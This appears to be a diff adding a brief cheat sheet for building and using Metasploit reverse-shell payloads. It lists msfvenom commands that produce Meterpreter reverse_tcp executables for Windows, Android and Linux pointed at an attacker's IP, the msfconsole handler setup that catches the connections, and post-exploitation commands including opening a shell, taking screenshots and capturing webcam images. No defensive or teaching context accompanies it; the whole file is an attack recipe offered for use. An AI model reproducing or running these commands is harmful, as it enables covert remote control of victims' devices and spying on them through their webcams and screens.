@@ -1,0 +1,38 @@
+#windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=4444 -f exe > payload.exe
+
+#android
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=4444 -o payload.apk
+
+
+#linux
+msfvenom -p linux/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=4444 -f elf > payload.elf
+
+
+#setup
+
+msfconsole
+
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp   # Change based on payload
+set LHOST <Your_IP>
+set LPORT 4444
+exploit
+
+
+----------------------------
+
+run commands:
+
+
+sysinfo        # Get system info
+shell          # Get a system shell
+screenshot     # Take a screenshot (Windows)
+webcam_snap    # Capture from the webcam
+
+or
+
+help to get more commands
+
